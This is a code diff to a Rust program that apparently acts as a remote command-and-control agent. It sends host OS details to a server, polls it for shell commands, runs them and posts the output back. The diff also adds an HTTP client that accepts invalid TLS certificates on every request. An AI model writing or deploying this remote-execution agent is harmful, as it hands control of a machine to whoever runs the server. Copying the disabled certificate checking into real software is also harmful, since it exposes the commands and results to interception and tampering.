@@ -1,4 +1,4 @@
-use std::io::{self, Read};
+use std::io::{self, Error, ErrorKind, Read};
 use std::process::Command;
 use std::env;
 use std::fs;
@@ -21,6 +21,18 @@ fn create_command(command: &str, args: &[&str]) -> Command {
     let mut cmd = Command::new(command);
     cmd.args(args);
     cmd
+}
+
+// Create a reusable ureq agent that skips TLS verification
+fn create_agent() -> ureq::Agent {
+    ureq::AgentBuilder::new()
+        .tls_connector(std::sync::Arc::new(
+            native_tls::TlsConnector::builder()
+                .danger_accept_invalid_certs(true)
+                .build()
+                .unwrap()
+        ))
+        .build()
 }
 
 async fn execute_and_capture(cmd: &str, args: &[&str]) -> io::Result<String> {
@@ -85,12 +97,7 @@ fn stdin_ready() -> io::Result<bool> {
 }
 
 async fn send_heartbeat(server_addr: &str, agent_id: &str) -> io::Result<()> {
-    let url = if !server_addr.starts_with("http://") && !server_addr.starts_with("https://") {
-        format!("http://{}/api/agent/{}/heartbeat", server_addr, agent_id)
-    } else {
-        format!("{}/api/agent/{}/heartbeat", server_addr, agent_id)
-    };
-    
+    let url = format!("{}/api/agent/{}/heartbeat", server_addr, agent_id);
     println!("[DEBUG] Sending heartbeat to {} for agent {}", url, agent_id);
     
     let os = os_info::get();
@@ -105,7 +112,8 @@ async fn send_heartbeat(server_addr: &str, agent_id: &str) -> io::Result<()> {
         "commands": Vec::<String>::new()
     });
 
-    match ureq::post(&url)
+    let agent = create_agent();
+    match agent.post(&url)
         .set("Content-Type", "application/json")
         .send_json(data)
     {
@@ -121,13 +129,10 @@ async fn send_heartbeat(server_addr: &str, agent_id: &str) -> io::Result<()> {
 }
 
 async fn get_command(server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
-    let url = if !server_addr.starts_with("http://") && !server_addr.starts_with("https://") {
-        format!("http://{}/api/agent/{}/command", server_addr, agent_id)
-    } else {
-        format!("{}/api/agent/{}/command", server_addr, agent_id)
-    };
+    let url = format!("{}/api/agent/{}/command", server_addr, agent_id);
+    let agent = create_agent();
     
-    match ureq::get(&url).call() {
+    match agent.get(&url).call() {
         Ok(response) => {
             if response.status() == 204 {
                 return Ok(None);
@@ -152,7 +157,8 @@ async fn submit_result(server_addr: &str, agent_id: &str, command: &str, output:
         "timestamp": chrono::Utc::now().to_rfc3339()
     });
 
-    match ureq::post(&url)
+    let agent = create_agent();
+    match agent.post(&url)
         .set("Content-Type", "application/json")
         .send_json(data)
     {
@@ -167,25 +173,12 @@ async fn submit_result(server_addr: &str, agent_id: &str, command: &str, output:
 // POSTCONDITION: The shell will exit when the user types 'exit'.
 pub async fn run_shell(server_addr: &str, agent_id: &str) -> io::Result<()> {
     println!("[DEBUG] Starting shell with agent ID: {}", agent_id);
-
-    let base_url = if !server_addr.starts_with("http://") && !server_addr.starts_with("https://") {
-        format!("http://{}", server_addr)
-    } else {
-        server_addr.to_string()
-    };
-
-    // Set working directory to user's home on Windows
-    #[cfg(windows)]
-    if let Ok(home) = env::var("USERPROFILE") {
-        env::set_current_dir(home)?;
-    }
-
-    send_heartbeat(&base_url, agent_id).await?;
+    send_heartbeat(server_addr, agent_id).await?;
     
     loop {
         // Poll for commands
         println!("[DEBUG] Polling for commands...");
-        match get_command(&base_url, agent_id).await? {
+        match get_command(server_addr, agent_id).await? {
             Some(command) => {
                 println!("[DEBUG] Received command: {}", command);
                 
@@ -197,7 +190,7 @@ pub async fn run_shell(server_addr: &str, agent_id: &str) -> io::Result<()> {
                 let cmd_parts: Vec<&str> = command.split_whitespace().collect();
                 
                 let output = execute_command(&cmd_parts).await?;
-                submit_result(&base_url, agent_id, &command, &output).await?;
+                submit_result(server_addr, agent_id, &command, &output).await?;
             }
             None => {
                 tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
